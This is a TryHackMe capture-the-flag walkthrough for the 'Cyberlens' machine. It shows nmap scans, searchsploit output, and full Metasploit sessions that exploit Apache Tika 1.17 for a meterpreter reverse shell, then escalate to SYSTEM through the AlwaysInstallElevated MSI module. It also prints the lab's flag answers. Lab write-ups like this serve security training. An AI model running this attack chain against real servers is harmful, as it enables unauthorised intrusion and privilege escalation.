---
title: Cyberlens
date: '2024-12-30'
category: tryhackme
tags: tryhackme, ctf
description: Detailed technical walkthrough and security analysis for the Cyberlens
  machine on TryHackMe.
slug: cyberlens
---




> target - 10.201.116.26
> Things to Note

1. Be sure to add the IP to your /etc/hosts file: `sudo echo '10.201.116.26 cyberlens.thm' >> /etc/hosts`
2. Make sure you wait 5 minutes before starting so the VM fully starts each service


> Found somethink run on 61777 port wia website  source cord

```
fetch("http://cyberlens.thm:61777/meta", {
            method: "PUT",
            body: fileData,
            headers: {
              "Accept": "application/json",
              "Content-Type": "application/octet-stream"
            }
            
```

> So check that port wia nmap and found tika apache vaulnerbility


```
❯ nmap cyber.thm
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-09 08:32 EDT
Nmap scan report for cyber.thm (10.201.116.26)
Host is up (0.36s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 27.30 seconds
❯ nmap cyber.thm -p80
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-09 08:39 EDT
Nmap scan report for cyber.thm (10.201.116.26)
Host is up (0.35s latency).

PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.01 seconds
❯ nmap -p 61777 -sC -sV cyber.thm -Pn -vv
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-09 08:42 EDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:42
Completed NSE at 08:42, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:42
Completed NSE at 08:42, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:42
Completed NSE at 08:42, 0.00s elapsed
Initiating SYN Stealth Scan at 08:42
Scanning cyber.thm (10.201.116.26) [1 port]
Discovered open port 61777/tcp on 10.201.116.26
Completed SYN Stealth Scan at 08:42, 0.37s elapsed (1 total ports)
Initiating Service scan at 08:42
Scanning 1 service on cyber.thm (10.201.116.26)
Completed Service scan at 08:42, 12.38s elapsed (1 service on 1 host)
NSE: Script scanning 10.201.116.26.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:42
Completed NSE at 08:42, 7.80s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:42
Completed NSE at 08:42, 1.67s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:42
Completed NSE at 08:42, 0.01s elapsed
Nmap scan report for cyber.thm (10.201.116.26)
Host is up, received user-set (0.34s latency).
Scanned at 2025-10-09 08:42:26 EDT for 22s

PORT      STATE SERVICE REASON          VERSION
61777/tcp open  http    syn-ack ttl 125 Jetty 8.y.z-SNAPSHOT
|_http-cors: HEAD GET
|_http-server-header: Jetty(8.y.z-SNAPSHOT)
|_http-title: Welcome to the Apache Tika 1.17 Server
| http-methods: 
|   Supported Methods: POST GET PUT OPTIONS HEAD
|_  Potentially risky methods: PUT

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:42
Completed NSE at 08:42, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:42
Completed NSE at 08:42, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:42
Completed NSE at 08:42, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.17 seconds
           Raw packets sent: 1 (44B) | Rcvd: 1 (44B)

```

> So Use searchploit and found this


```
❯ searchsploit Apache Tika
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                           |  Path
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache Tika 1.15 - 1.17 - Header Command Injection (Metasploit)                                                          | windows/remote/47208.rb
Apache Tika-server < 1.18 - Command Injection                                                                            | windows/remote/46540.py
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results


```

> So use msfconsole

```
msf exploit(windows/http/apache_tika_jp2_jscript) > options

Module options (exploit/windows/http/apache_tika_jp2_jscript):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, http, so
                                         cks5h
   RHOSTS     cyber.thm        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      61777            yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The base path to the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to liste
                                       n on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.21.16.42      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows



View the full module info with the info, or info -d command.
msf exploit(windows/http/apache_tika_jp2_jscript) > exploit



```

> and get reverseshell connection

```
meterpreter > 
meterpreter > pwd
C:\Windows\system32

meterpreter > cd ../../users
meterpreter > pwd
C:\users
meterpreter > ls
Listing: C:\users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  8192  dir   2025-10-09 08:41:58 -0400  Administrator
040777/rwxrwxrwx  0     dir   2018-09-15 03:28:48 -0400  All Users
040777/rwxrwxrwx  8192  dir   2023-11-25 02:31:22 -0500  CyberLens
040555/r-xr-xr-x  8192  dir   2021-03-17 10:58:07 -0400  Default
040777/rwxrwxrwx  0     dir   2018-09-15 03:28:48 -0400  Default User
040555/r-xr-xr-x  4096  dir   2018-12-12 02:45:15 -0500  Public
100666/rw-rw-rw-  174   fil   2018-09-15 03:16:48 -0400  desktop.ini

meterpreter > cd CyberLens
meterpreter > ls
Listing: C:\users\CyberLens

meterpreter > cd Desktop
meterpreter > ls
Listing: C:\users\CyberLens\Desktop
===================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  527   fil   2016-06-21 11:36:17 -0400  EC2 Feedback.website
100666/rw-rw-rw-  554   fil   2016-06-21 11:36:23 -0400  EC2 Microsoft Windows Guide.website
100666/rw-rw-rw-  282   fil   2023-06-06 15:48:33 -0400  desktop.ini
100666/rw-rw-rw-  25    fil   2023-06-06 15:54:19 -0400  user.txt

meterpreter > cat user.txt
THM{T1k4-CV3-f0r-7h3-w1n}
meterpreter > 

```

> To find admin.txt also use msfconsole but use another payload and module

```
msf > search use multi/recon/local_exploit_suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester  .                normal  No     Multi Recon Local Exploit Suggester


Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

msf > search /windows/local/always_install_elevated

Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
   0  exploit/windows/local/always_install_elevated  2010-03-18       excellent  Yes    Windows AlwaysInstallElevated MSI


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/local/always_install_elevated

msf > 

```

> So use this

```
meterpreter > background
[*] Backgrounding session 1...
msf exploit(windows/http/apache_tika_jp2_jscript) > 
msf exploit(windows/http/apache_tika_jp2_jscript) > use multi/recon/local_exploit_suggester
msf post(multi/recon/local_exploit_suggester) > use exploit/windows/local/always_install_elevated
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/local/always_install_elevated) > set SESSION 1
SESSION => 1
msf exploit(windows/local/always_install_elevated) > exploit
[*] Started reverse TCP handler on 10.21.16.42:4444 
[*] Uploading the MSI to C:\Users\CYBERL~1\AppData\Local\Temp\1\NcivPhvsVr.msi ...
[*] Executing MSI...
[*] Sending stage (177734 bytes) to 10.201.116.26
[+] Deleted C:\Users\CYBERL~1\AppData\Local\Temp\1\NcivPhvsVr.msi
[*] Meterpreter session 2 opened (10.21.16.42:4444 -> 10.201.116.26:49941) at 2025-10-09 09:27:52 -0400

meterpreter > pwd
C:\Windows\system32


meterpreter > cd ../../
meterpreter > pwd
C:\
meterpreter > cd users
meterpreter > pwd
C:\users
meterpreter > ls
Listing: C:\users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  8192  dir   2025-10-09 08:41:58 -0400  Administrator
040777/rwxrwxrwx  0     dir   2018-09-15 03:28:48 -0400  All Users
040777/rwxrwxrwx  8192  dir   2023-11-25 02:31:22 -0500  CyberLens
040555/r-xr-xr-x  8192  dir   2021-03-17 10:58:07 -0400  Default
040777/rwxrwxrwx  0     dir   2018-09-15 03:28:48 -0400  Default User
040555/r-xr-xr-x  4096  dir   2018-12-12 02:45:15 -0500  Public
100666/rw-rw-rw-  174   fil   2018-09-15 03:16:48 -0400  desktop.ini

meterpreter > cd Administrator

meterpreter > cd Desktop
meterpreter > ls
Listing: C:\users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  527   fil   2016-06-21 11:36:17 -0400  EC2 Feedback.website
100666/rw-rw-rw-  554   fil   2016-06-21 11:36:23 -0400  EC2 Microsoft Windows Guide.website
100666/rw-rw-rw-  24    fil   2023-11-27 14:50:45 -0500  admin.txt
100666/rw-rw-rw-  282   fil   2021-03-17 11:13:27 -0400  desktop.ini

meterpreter > cat admin.txt
THM{3lev@t3D-4-pr1v35c!}
meterpreter >


```

#`exploit/windows/http/apache_tika_jp2_jscript` — _remote exploit / initial access_

**Goal:** get a remote shell (a Meterpreter session) on the target by abusing an Apache Tika server.

**What it does (high level):**

- The module targets a specific vulnerability in Apache Tika that allows the attacker to send specially crafted HTTP requests (usually PUT to `/meta`) that cause the server to interpret attacker-supplied data as script/commands.
    
- Metasploit’s module sends a small _command stager_ (chunks of a payload) via HTTP requests that the server writes/executes.
    
- The stager arranges for the target to download and run a larger payload (the Meterpreter _stage_). Once the stage runs, you get an interactive Meterpreter session back to your listener (LHOST:LPORT).
    

**What happens on the network / target:**

- Your msfconsole opens a listener on your machine.
    
- The exploit sends multiple HTTP PUT requests to the target (e.g. `PUT /meta`) carrying parts of the stager.
    
- The target processes those requests, ends up executing the stager (because of the vulnerability), which then downloads/executes the Meterpreter payload.
    
- After the stage runs, a TCP connection is made back to your machine and `Meterpreter session X opened` appears.
    

**What Meterpreter gives you:**

- An interactive agent with many built-in commands: `sysinfo`, `getuid`, `ls`, `cat`, `upload`, `download`, `shell` (drops into cmd.exe), and helpers for post-exploitation.
    
- This is typically a **low-privilege** account (not SYSTEM/Administrator) unless the exploit already gave higher privileges.
    

---

#`multi/recon/local_exploit_suggester` — _post-exploit reconnaissance_

**Goal:** with an existing session, scan the target’s environment and recommend _local_ Metasploit modules that are likely to escalate privileges.

**What it does (high level):**

- It **does not exploit** anything. Instead, it enumerates the host (via your session) and runs the `check` routine of many local exploit modules that exist in your Metasploit installation.
    
- Each local exploit module usually implements a `check` method that inspects the system (kernel version, installed patches, registry values, services, SUID bits, file permissions, etc.) and returns whether the vulnerability _looks_ exploitable.
    
- The suggester aggregates the checks and prints a list of candidate local exploits (with indications like “appears vulnerable”, “failed check”, or error).
    

**What happens on the victim:**

- The suggester calls Meterpreter commands or runs lightweight probes on the target to collect info (OS, architecture, patch level, registry keys, installed programs).
    
- For each local exploit it runs the exploit module’s `check` (which usually reads files/registry or runs harmless commands). This is mostly read/enum activity — not destructive.
    

**Why run it:**

- Saves time and reduces trial-and-error. Rather than blindly trying many LPEs that might crash or do nothing, the suggester narrows down plausible candidates.
    
- Still requires manual verification: `check` can give false positives/negatives. You should `use` the suggested exploit and run `check`/inspect code/options before running `exploit`.
    

---

#`exploit/windows/local/always_install_elevated` — _local privilege escalation (LPE)_

**Goal:** escalate from a normal user to SYSTEM/Administrator on Windows when the machine has a specific misconfiguration.

**What it targets:** the Windows Group Policy setting **AlwaysInstallElevated** (when set to `1` in either HKCU or HKLM), which makes MSI package installations run with SYSTEM privileges.

**What it does (high level):**

- The module creates a **malicious MSI installer** that contains payload code (a Meterpreter or other payload).
- It transfers the MSI to the target (via the existing session), then calls `msiexec` or otherwise triggers Windows Installer to install that MSI.
- Because the policy is enabled, Windows installs the MSI with **SYSTEM** privileges—so the payload inside the MSI runs as SYSTEM.
- The module sets up a new payload/listener and you receive a new Meterpreter session running as SYSTEM (higher privileged session).

**What happens on the victim:**

- The exploit writes an MSI file somewhere on disk.
- The exploit executes the MSI using standard Windows installer mechanisms (like `msiexec`).
- Windows Installer runs the MSI code as SYSTEM due to the policy; the payload runs and opens a privileged callback to your listener.
- You get a second session (or replace the session) that has SYSTEM/Administrator privileges.

**Important note:** this **only works** if `AlwaysInstallElevated` is enabled (checked via registry). If not enabled, the MSI will run with the user’s privilege and the exploit fails.

---



1. **Find a remote vulnerability** (Apache Tika) → use `exploit/windows/http/apache_tika_jp2_jscript`.  
    Result: you get a Meterpreter session (initial foothold).
    
2. **Enumerate for escalation options** → run `multi/recon/local_exploit_suggester` against that session.  
    Result: a shortlist of local exploits that look promising (e.g., AlwaysInstallElevated flagged).
    
3. **Use the chosen local exploit** → `use exploit/windows/local/always_install_elevated`; `set SESSION <id>`; `exploit`.  
    Result: the module builds and runs an MSI installer on target and (if successful) gives you a SYSTEM session. Then you `cd` into `C:\Users\Administrator\Desktop` and `cat admin.txt` — admin flag acquired.